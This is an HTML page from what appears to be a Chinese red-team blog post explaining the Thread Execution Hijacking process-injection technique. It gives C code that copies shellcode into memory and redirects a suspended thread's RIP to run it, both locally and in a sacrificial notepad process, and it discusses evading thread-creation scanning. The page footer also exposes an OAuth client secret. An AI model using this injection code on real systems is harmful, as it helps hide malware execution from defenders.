@@ -1,0 +1,297 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Thread Execution Hijacking技术 | 白袍的小行星</title>
+<link rel="shortcut icon" href="https://red-team.tips/favicon.ico?v=1710333081950">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://red-team.tips/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Thread Execution Hijacking技术 | 白袍的小行星 - Atom Feed" href="https://red-team.tips/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Thread Execution Hijacking是进程注入技术的一个子类，指先暂停或挂起线程，再修改其内存空间，将其替换为恶意代码，最后恢复，达到不创建新线程来执行恶意代码的目的。
+0x1 背景知识
+线程上下文（Thread Conte..." />
+    <meta name="keywords" content="红队研究" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://red-team.tips">
+  <img class="avatar" src="https://red-team.tips/images/avatar.png?v=1710333081950" alt="">
+  </a>
+  <h1 class="site-title" data-text=白袍的小行星>
+    白袍的小行星
+  </h1>
+  <p class="site-description">
+    <strong>Once a hacker, always a hacker!</strong>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/evilAdan0s" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Adan0s1" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Thread Execution Hijacking技术
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-09-20
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://red-team.tips/tag/f5G6oBVmo/" class="post-tag">
+                  # 红队研究
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p><a href="https://attack.mitre.org/techniques/T1055/003/">Thread Execution Hijacking</a>是进程注入技术的一个子类，指先暂停或挂起线程，再修改其内存空间，将其替换为恶意代码，最后恢复，达到不创建新线程来执行恶意代码的目的。</p>
+<h1 id="0x1-背景知识">0x1 背景知识</h1>
+<p>线程上下文（Thread Context）包括了线程无缝恢复执行所需的所有信息，包括CPU寄存器、堆栈等。</p>
+<p>线程上下文对应<code>CONTEXT</code>结构，不同的CPU则有不同的结构，具体可以参看<a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context">CONTEXT structure</a></p>
+<p>这里需要介绍两个Win32 API：</p>
+<ul>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext">GetThreadContext()</a>：获取线程上下文<code>CONTEXT</code>结构</li>
+<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">SetThreadContext()</a>：将<code>CONTEXT</code>结构填充给指定线程</li>
+</ul>
+<h1 id="0x2-代码实现">0x2 代码实现</h1>
+<p>首先，我们将创建一个新线程并将其挂起或暂停，它的入口是一个正常函数，使用<code>CreateThread()</code>即可实现：</p>
+<pre><code class="language-c">/*void Test()
+{
+    int a = 1;
+    int b = a + 10;
+}*/
+
+HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&amp;Test, NULL, CREATE_SUSPENDED, NULL)
+</code></pre>
+<p>除了在创建进程时设置<code>dwCreationFlags</code>参数外，还可以使用<code>SuspendThread()</code>函数来挂起正常线程。</p>
+<p>之后，需要先将payload拷贝至内存：</p>
+<pre><code class="language-c">PVOID pAddress = VirtualAllic(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+memcpy(pAddress, shellcode, sizeof(shellcode));
+VirtualProtect(pAddress, sizeof(shellcode), PAGE_EXECUTE_READWRITE, NULL);
+</code></pre>
+<p>再获取线程上下文，并修改<code>RIP</code>，使其指向存放payload的位置，并恢复线程：</p>
+<pre><code class="language-c">CONTEXT ThreadCt = {
+        .ContextFlags = CONTEXT_CONTROL
+};
+
+GetThreadContext(hThread, &amp;ThreadCt);
+ThreadCt.Rip = pAddress;
+SetThreadContext(hThread, &amp;ThreadCt);
+ResumeThread(hThread);
+</code></pre>
+<p>这里要注意：调用<code>GetThreadContext()</code>前需要为<code>CONTEXT.ContextFlags</code>赋值，且为了进行线程劫持，该值必须是<code>CONTEXT_CONTROL</code>或<code>CONTEXT_ALL</code>.</p>
+<p>另外，进程的主线程是不能被劫持的，所以我们选择创建一个新线程作为目标。</p>
+<p>实现效果：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/202309200941193sDcK4To45sr.jpg" alt="202309200941193sDcK4To45sr" loading="lazy"></p>
+<p>可以看到，反向shell已经建立：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/202309200941319me8b4zlhYVn.jpg" alt="202309200941319me8b4zlhYVn" loading="lazy"></p>
+<h1 id="0x3-拓展">0x3 拓展</h1>
+<p>这里是对本地的线程进行劫持，是否可以劫持远程进程的线程呢？</p>
+<p>也许你会想，可以使用<code>CreateRemoteThread()</code>创建远程进程的线程然后再劫持，但这种操作的opsec不佳，更好的选择是以暂停状态创建一个牺牲进程，并劫持其中的线程。</p>
+<p>使用<code>CreateProcess()</code>可以实现这一点：</p>
+<pre><code class="language-c">BOOL CreateProcessA(
+  [in, optional]      LPCSTR                lpApplicationName, //进程名
+  [in, out, optional] LPSTR                 lpCommandLine, //命令行参数
+  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
+  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
+  [in]                BOOL                  bInheritHandles,
+  [in]                DWORD                 dwCreationFlags, //进程创建标志
+  [in, optional]      LPVOID                lpEnvironment,
+  [in, optional]      LPCSTR                lpCurrentDirectory,
+  [in]                LPSTARTUPINFOA        lpStartupInfo,
+  [out]               LPPROCESS_INFORMATION lpProcessInformation
+);
+</code></pre>
+<p>我们来创建一个记事本进程：</p>
+<pre><code class="language-c">STARTUPINFO Si = { 0 };
+PROCESS_INFORMATION Pi = { 0 };
+
+RtlSecureZeroMemory(&amp;Si, sizeof(STARTUPINFO));
+RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));
+
+Si.cb = sizeof(STARTUPINFO);
+
+CreateProcess(NULL, &quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL, NULL, FALSE, CREATE_SUSPENED, NULL, NULL, &amp;Si, &amp;Pi);
+</code></pre>
+<p>之后将payload注入远程进程，注意这里只是将其写入但不执行：</p>
+<pre><code class="language-c">PVOID pAddress = VirtualAllocEx(Pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+WriteProcessMemory(Pi.hProcess, pAddress, shellcode, sizeof(shellcode), NULL);
+VirtualProtectEx(Pi.hProcess, pAddress, sizeof(shellcode), PAGE_EXECUTE_READWRITE, NULL);
+</code></pre>
+<p>劫持线程的步骤是一样的，只是需要在恢复线程后使用<code>WaitForSingleObject()</code>进行等待。</p>
+<p>效果：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20230920094203r0funhR43RQx.jpg" alt="20230920094203r0funhR43RQx" loading="lazy"></p>
+<h1 id="0x4-小结">0x4 小结</h1>
+<p>本文简单介绍了线程劫持技术的原理和代码实现，该技术我认为能在一定程度上对抗线程创建扫描，但跟Havoc作者聊了一下：<br>
+<img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20230920094210I4aWcuX1Wbsc.jpg" alt="20230920094210I4aWcuX1Wbsc" loading="lazy"></p>
+<p>有机会测试一下。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#0x1-%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86">0x1 背景知识</a></li>
+<li><a href="#0x2-%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0">0x2 代码实现</a></li>
+<li><a href="#0x3-%E6%8B%93%E5%B1%95">0x3 拓展</a></li>
+<li><a href="#0x4-%E5%B0%8F%E7%BB%93">0x4 小结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://red-team.tips/post/i9wIRUeqw/">
+              <h3 class="post-title">
+                我的OSCE3之路——OSEP
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '971b65ce804f770e6019',
+    clientSecret: 'a9fca4ca8deef880c5fac95e97fceb4edb23098a',
+    repo: 'eviladan0s.github.io',
+    owner: 'eviladan0s',
+    admin: ['eviladan0s'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://red-team.tips/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
